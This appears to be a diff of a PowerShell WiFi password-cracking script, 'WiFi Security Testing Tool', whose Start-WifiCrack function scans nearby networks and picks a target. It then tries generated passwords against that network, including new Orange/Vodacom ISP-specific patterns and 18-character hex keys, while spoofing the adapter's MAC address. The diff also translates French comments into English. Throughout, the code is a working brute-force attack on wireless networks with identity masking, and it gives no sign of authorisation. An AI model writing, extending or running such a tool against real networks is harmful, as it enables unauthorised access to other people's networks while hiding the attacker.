@@ -1193,10 +1179,10 @@ function Start-WifiCrack {
         
         Clear-Host
         Write-Host "WiFi Security Testing Tool v5.0" -ForegroundColor Cyan
-        Write-Host "OS: $($envInfo.OS) | Mode: $Mode | Region: $($script:CONFIG.RegionTarget)" -ForegroundColor Gray
+        Write-Host "OS: $($envInfo.OS) | Mode: $Mode | Pattern Mode: $($script:CONFIG.PatternMode)" -ForegroundColor Gray
         Write-Host "===================================================" -ForegroundColor Cyan
         
-        # Sélection adaptateur
+        # Select adapter
         $adapter = Select-NetworkAdapter
         if (-not $adapter) { return }
         
@@ -1216,7 +1202,7 @@ function Start-WifiCrack {
             }
         }
         
-        # Scan réseaux
+        # Scan networks
         Write-Host "`nScanning for networks..." -ForegroundColor Yellow
         $networks = Get-WifiNetworks -LogFile $defaultLogs.LogFile -DebugFile $defaultLogs.DebugFile
         
@@ -1227,10 +1213,10 @@ function Start-WifiCrack {
         
         Write-Host "`nAvailable Networks:" -ForegroundColor Cyan
         for ($i = 0; $i -lt $networks.Count; $i++) {
-            Write-Host "[$i] $($networks[$i].SSID) (Signal: $($networks[$i].Signal)%)" -ForegroundColor Green
+            Write-Host "[$i] $($networks[$i].SSID) (Signal: $($networks[$i].Signal)%, Security: $($networks[$i].Security))" -ForegroundColor Green
         }
         
-        # Sélection réseau
+        # Select network
         do {
             $sel = Read-Host "`nSelect network (0-$($networks.Count - 1))"
         } while ($sel -notmatch '^\d+$' -or [int]$sel -lt 0 -or [int]$sel -ge $networks.Count)
@@ -1238,10 +1224,10 @@ function Start-WifiCrack {
         $target = $networks[[int]$sel]
         Write-Host "`nTarget: $($target.SSID)" -ForegroundColor Cyan
         
-        # Initialisation
+        # Initialize
         $paths = Get-LogPaths -SSID $target.SSID
         
-        # Génération mots de passe
+        # Generate passwords
         Write-Host "`nGenerating password list..." -ForegroundColor Yellow
         $wrongPasswords = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
         
@@ -1257,6 +1243,9 @@ function Start-WifiCrack {
         }
         
         Write-Host "Total passwords to test: $($passwordList.Count)" -ForegroundColor Cyan
+        if ($script:CONFIG.PatternMode) {
+            Write-Host "Pattern mode enabled: Orange/Vodacom specific patterns included" -ForegroundColor Magenta
+        }
         Write-Host "Press 'Q' to stop`n" -ForegroundColor Yellow
         
         # Test
@@ -1265,7 +1254,7 @@ function Start-WifiCrack {
         $connectionMgr.StartTimer()
         
         $hexTested = 0
-        $regularTested = 0
+        $patternTested = 0
         
         foreach ($password in $passwordList) {
             if ([Console]::KeyAvailable) {
@@ -1275,14 +1264,14 @@ function Start-WifiCrack {
             
             $progress.UpdateProgress($password)
             
-            # Compteur
+            # Counter
             if ($password -match '^[0-9A-F]{18}$') { 
                 $hexTested++ 
             } else { 
-                $regularTested++ 
+                $patternTested++ 
             }
             
-            # Vérification sécurité périodique
+            # Periodic security check
             $timeSinceLastCheck = (Get-Date) - $script:CONFIG.LastSecurityCheck
             if ($timeSinceLastCheck.TotalSeconds -gt $script:CONFIG.SecurityCheckInterval) {
                 if (-not $SkipSecurityCheck) {
@@ -1296,7 +1285,7 @@ function Start-WifiCrack {
                 $script:CONFIG.LastSecurityCheck = Get-Date
             }
             
-            # Test connexion
+            # Test connection
             $success = Test-WifiConnection -SSID $target.SSID -Password $password -Security $target.Security -Interface $script:CONFIG.Interface -LogFile $paths.LogFile -DebugFile $paths.DebugFile
             
             if ($success) {
@@ -1310,6 +1299,8 @@ function Start-WifiCrack {
                 
                 if ($password -match '^[0-9A-F]{18}$') {
                     Write-Host "Type: 18-char HEXADECIMAL" -ForegroundColor Magenta
+                } else {
+                    Write-Host "Type: ISP Pattern (Orange/Vodacom)" -ForegroundColor Cyan
                 }
                 
                 Write-Log "SUCCESS: Password found" "SUCCESS" $paths.LogFile $paths.DebugFile
@@ -1323,7 +1314,7 @@ Date: $(Get-Date)
 "@
                 $result | Out-File -FilePath $paths.SuccessFile -Encoding UTF8
                 
-                # Restaurer MAC
+                # Restore MAC
                 if (-not $DisableMacSpoof) {
                     Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
                 }
@@ -1334,15 +1325,15 @@ Date: $(Get-Date)
             Add-Content -Path $paths.WrongPasswordsFile -Value $password
         }
         
-        # Fin
+        # End
         $progress.Complete()
         $elapsed = $connectionMgr.GetElapsedTime()
         
         Write-Host "`nPassword not found." -ForegroundColor Red
         Write-Host "Time: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Yellow
-        Write-Host "Tested: Regular=$regularTested, HEX-18=$hexTested" -ForegroundColor Gray
+        Write-Host "Tested: Hex=$hexTested, Patterns=$patternTested" -ForegroundColor Gray
         
-        # Restaurer MAC
+        # Restore MAC
         if (-not $DisableMacSpoof) {
             Write-Host "`nRestoring original MAC..." -ForegroundColor Yellow
             Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
@@ -1358,9 +1349,9 @@ Date: $(Get-Date)
         }
     }
     finally {
-        # S'assurer que la MAC est restaurée et l'interface réactivée en cas d'arrêt brutal
+        # Ensure MAC is restored on abrupt exit
         if (-not $DisableMacSpoof -and $script:CONFIG.Interface -and $script:CONFIG.SpoofedMac) {
-            Write-Host "`nArrêt détecté. Restauration de la MAC d'origine..." -ForegroundColor Yellow
+            Write-Host "`nExit detected. Restoring original MAC..." -ForegroundColor Yellow
             Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
         }
         
@@ -1370,7 +1361,7 @@ Date: $(Get-Date)
 }
 
 # ============================================
-# POINT D'ENTRÉE
+# ENTRY POINT
 # ============================================
 
 try {
